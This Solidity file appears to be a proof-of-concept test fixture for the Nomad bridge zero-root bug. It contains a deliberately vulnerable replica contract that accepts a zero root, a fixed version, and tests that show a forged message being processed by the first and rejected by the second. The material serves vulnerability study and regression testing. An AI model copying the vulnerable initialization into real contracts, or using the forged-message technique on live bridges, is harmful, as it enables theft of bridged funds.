// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract NomadReplicaVulnerablePoCFixture {
    bytes32 public constant LEGACY_STATUS_PROCESSED = bytes32(uint256(2));
    mapping(bytes32 => uint256) public confirmAt;
    mapping(bytes32 => bytes32) public messages;

    function initialize(bytes32 committedRoot) external {
        confirmAt[committedRoot] = 1;
    }

    function acceptableRoot(bytes32 root) public view returns (bool) {
        uint256 time = confirmAt[root];
        if (time == 0) return false;
        return block.timestamp >= time;
    }

    function process(bytes32 messageHash) external returns (bool) {
        require(acceptableRoot(messages[messageHash]), "!proven");
        messages[messageHash] = LEGACY_STATUS_PROCESSED;
        return true;
    }
}

contract NomadReplicaFixedPoCFixture {
    mapping(bytes32 => uint256) public confirmAt;
    mapping(bytes32 => bytes32) public messages;

    function initialize(bytes32 committedRoot) external {
        require(committedRoot != bytes32(0), "zero root");
        confirmAt[committedRoot] = 1;
    }

    function acceptableRoot(bytes32 root) public view returns (bool) {
        uint256 time = confirmAt[root];
        if (time == 0) return false;
        return block.timestamp >= time;
    }

    function process(bytes32 messageHash) external returns (bool) {
        require(acceptableRoot(messages[messageHash]), "!proven");
        messages[messageHash] = bytes32(uint256(2));
        return true;
    }
}

contract NomadZeroRootPoC {
    function testZeroRootAcceptedByVulnerableFixture() external {
        NomadReplicaVulnerablePoCFixture replica = new NomadReplicaVulnerablePoCFixture();
        replica.initialize(bytes32(0));

        bytes32 forgedMessage = keccak256("forged message");
        require(replica.acceptableRoot(bytes32(0)), "zero root was not accepted");
        require(replica.process(forgedMessage), "forged message was not processed");
        require(
            replica.messages(forgedMessage) == bytes32(uint256(2)),
            "message status was not updated"
        );
    }

    function testZeroRootRejectedByFixedContrast() external {
        NomadReplicaFixedPoCFixture replica = new NomadReplicaFixedPoCFixture();
        (bool initialized, ) = address(replica).call(
            abi.encodeWithSelector(replica.initialize.selector, bytes32(0))
        );
        require(!initialized, "fixed fixture accepted zero-root initialization");

        bytes32 forgedMessage = keccak256("forged message");
        (bool processed, ) = address(replica).call(
            abi.encodeWithSelector(replica.process.selector, forgedMessage)
        );
        require(!processed, "fixed fixture processed an unproven message");
    }
}
